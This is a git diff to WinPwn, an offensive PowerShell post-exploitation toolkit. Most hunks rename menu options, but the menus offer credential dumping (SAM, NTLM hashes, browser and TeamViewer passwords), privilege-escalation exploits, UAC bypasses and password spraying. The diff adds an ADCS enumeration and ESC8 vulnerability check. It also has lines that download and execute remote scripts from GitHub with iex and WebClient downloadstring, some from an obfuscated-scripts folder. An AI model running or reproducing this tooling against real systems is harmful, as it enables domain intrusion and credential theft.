@@ -227,7 +227,7 @@ __        ___       ____
             Write-Host -ForegroundColor Green '4. Get all those Browser Credentials with Sharpweb! '
             Write-Host -ForegroundColor Green '5. Check common Privesc vectors using Sharpup! '
             Write-Host -ForegroundColor Green '6. Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS! '
-            Write-Host -ForegroundColor Green '7. Exit. '
+            Write-Host -ForegroundColor Green '7. Go back. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -354,7 +354,7 @@ __        ___       ____
             Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
             Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
             Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
-	        Write-Host -ForegroundColor Green '5. Exit. '
+	        Write-Host -ForegroundColor Green '5. Go back '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -591,7 +591,7 @@ __        ___       ____
 	        Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
 	        Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
 		Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
-	        Write-Host -ForegroundColor Green '12. Exit. '
+	        Write-Host -ForegroundColor Green '12. Go back '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -832,7 +832,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '12. PrintNightmare - CVE-2021-34527/CVE-2021-1675 - June 2021 - All Windows versions running the Spooler Service!'
         Write-Host -ForegroundColor Green '13. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
         Write-Host -ForegroundColor Green '14. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
-        Write-Host -ForegroundColor Green '15. Exit. '
+        Write-Host -ForegroundColor Green '15. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1104,7 +1104,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
         Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
         Write-Host -ForegroundColor Green '9. Search for any .NET binary file in a share! '
-        Write-Host -ForegroundColor Green '10. Exit. '
+        Write-Host -ForegroundColor Green '10. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1651,7 +1651,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '3. Pop System Shell using NamedPipe Impersonation! '
         Write-Host -ForegroundColor Green '4. Bind System Shell using UsoClient DLL load!'
 	Write-Host -ForegroundColor Green '5. Pop System Shell using Token Manipulation!'
-        Write-Host -ForegroundColor Green '6. Exit. '
+        Write-Host -ForegroundColor Green '6. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
         Switch ($masterquestion) 
@@ -1722,7 +1722,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '2. UAC Bypass ccmstp technique, specify Binary! '
         Write-Host -ForegroundColor Green '3. DiskCleanup UAC Bypass, specify Binary! '
         Write-Host -ForegroundColor Green '4. DccwBypassUAC technique, only cmd shell pop up!'
-        Write-Host -ForegroundColor Green '5. Exit. '
+        Write-Host -ForegroundColor Green '5. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
         Switch ($masterquestion) 
@@ -1923,7 +1923,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '20. Check users for empty passwords! '
 	Write-Host -ForegroundColor Green '21. Check username=password combinations! '
         Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
-        Write-Host -ForegroundColor Green '23. Exit. '
+        Write-Host -ForegroundColor Green '23. Get the ADCS server(s) and templates + ESC8 Check! '
+        Write-Host -ForegroundColor Green '24. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1951,9 +1952,10 @@ __        ___       ____
 	 20{Domainpassspray -emptypasswords}
 	 21{Domainpassspray -usernameaspassword}
          22{Oxidresolver}
+         23{ADCSInfos}
        }
     }
- While ($masterquestion -ne 23)
+ While ($masterquestion -ne 24)
 }
 
 function generaldomaininfo{
@@ -2060,7 +2062,7 @@ if(!$consoleoutput){
     #Search for AD-Passwords in description fields
     Write-Host -ForegroundColor Yellow '------->  Searching for passwords in active directory description fields..'
     
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')            
+    iex ($admodule)            
     
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/adpass.ps1')
 
@@ -2113,6 +2115,80 @@ if(!$consoleoutput){
 	if(!$consoleoutput){rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt"}else{rewires -LocalGroup RDP -Identity $env:Username -domain $domain} 
 }
 
+function ADCSInfos
+{
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+    iex($admodule)
+    $Dom = Get-ADDomain
+    Write-Host -ForegroundColor Yellow '-------> Searching AD for ADCS Servers'
+    $ServerSearch = "CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,$Dom"
+    $Servers = Get-ADObject -Filter "*" -SearchBase $ServerSearch
+    if($consoleoutput){$Servers}else{$Servers >> "$currentPath\DomainRecon\ADCSServer.txt"}
+
+    $SearchCertTemplates = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$Dom"
+    Write-Host -ForegroundColor Yellow '-------> Searching AD for ADCS Templates'
+    $CertTemplates = Get-ADObject -Filter "*" -SearchBase $SearchCertTemplates
+    if($consoleoutput){$CertTemplates}else{$CertTemplates >> "$currentPath\DomainRecon\ADCSTemplates.txt"}
+
+    Write-Host -ForegroundColor Yellow '-------> Searching for the active CA-Server and checking for ESC8 (https://posts.specterops.io/certified-pre-owned-d95910965cd2)'
+    foreach ($Server in $servers.name)
+    {
+        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+        $FQDN = $Server + "." + $Domain
+        try
+        {
+            $Resolve = Resolve-DNSNAme $FQDN
+            $IP = $Resolve.IPAddress
+            Write-Host -ForegroundColor Yellow "$FQDN resolves to $IP"
+            
+            $client = New-Object System.Net.Sockets.TcpClient
+            $beginConnect = $client.BeginConnect($FQDN,"80",$null,$null)
+            Sleep 2
+            if($client.Connected)
+            {
+                Write-Host -ForegroundColor Yellow "$FQDN has Port 80 opened, maybe vulnerable!"
+                if(!$consoleoutput){$FQDN >> "$currentPath\DomainRecon\ADCS_Maybe_ESC8_Vulnerable.txt"}
+                try
+                {
+                    $CertURI = "http://" + $FQDN + "/certsrv/certfnsh.asp" 
+                    $WebResponse = iwr  -UseDefaultCredentials -uri $CertURI
+                    if ($WebResponse.Content -Match "Active Directory Certificate Services")
+                    {
+                        Write-Host -ForegroundColor Red "$FQDN serves certificates over HTTP and is therefore ESC8 vulnerable!"
+                        if(!$consoleoutput){$FQDN >> "$currentPath\Vulnerabilities\ADCS_ESC8_Vulnerable.txt"}
+                    }
+                    else
+                    {
+                        Write-Host -ForegroundColor Yellow "$FQDN hosts a Webserver over HTTP but doesn't match the ADCS content, check that manually!"
+                    }
+                }
+                catch
+                {
+                    Write-Host -ForegroundColor Yellow "Not able to connect to $CertURI, maybe the user is not authorized"
+                }
+
+            }
+            else
+            {
+                Write-Host -ForegroundColor Yellow "$FQDN has Port 80 closed, not vulnerable!"
+            }
+            $client.Close()
+            
+        }
+        catch
+        {
+            Write-Host -ForegroundColor Yellow "$FQDN cannot be resolved"
+        }
+    }
+}
+
 function Domainshares
 {
   @'
@@ -2132,7 +2208,7 @@ __        ___       ____
         Write-Host "================ WinPwn ================"
         Write-Host -ForegroundColor Green '1. Passhunt search for Powerview found shares!'
         Write-Host -ForegroundColor Green '2. Run Snaffler! '
-        Write-Host -ForegroundColor Green '3. Exit. '
+        Write-Host -ForegroundColor Green '3. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -3128,7 +3204,7 @@ __        ___       ____
             Write-Host -ForegroundColor Green '2. winPEAS! '
             Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
             Write-Host -ForegroundColor Green '4. All other checks! '
-            Write-Host -ForegroundColor Green '5. Exit. '
+            Write-Host -ForegroundColor Green '5. Go back '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -3987,3 +4063,6 @@ WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbel
      
    
 }
+
+
+$admodule = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')
